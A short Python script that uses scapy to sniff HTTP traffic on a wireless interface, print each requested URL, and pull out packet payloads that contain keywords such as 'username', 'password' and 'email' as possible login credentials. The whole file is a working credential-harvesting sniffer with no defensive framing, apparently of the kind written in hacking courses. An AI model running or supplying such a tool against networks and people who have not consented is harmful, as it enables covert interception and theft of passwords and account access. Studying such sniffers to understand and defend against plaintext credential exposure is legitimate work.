#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniff_packet)

def url_link(packet):
     return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
          if packet.haslayer(scapy.Raw):
               load = packet[scapy.Raw].load
               keywords = ["username", "user", "pass", "password", "login", "email"]
               for keyword in keywords:
                    if keyword in load:
                         return load

def process_sniff_packet(packet):
     if packet.haslayer(http.HTTPRequest):
          url = url_link(packet)
          print("\n[+] HTTP Request >>> " + url)
          login_info = get_login_info(packet)
          if login_info:
               print("\n\n[+] Possible Username & Password >>> " + login_info + "\n\n")

sniff("wlan0")
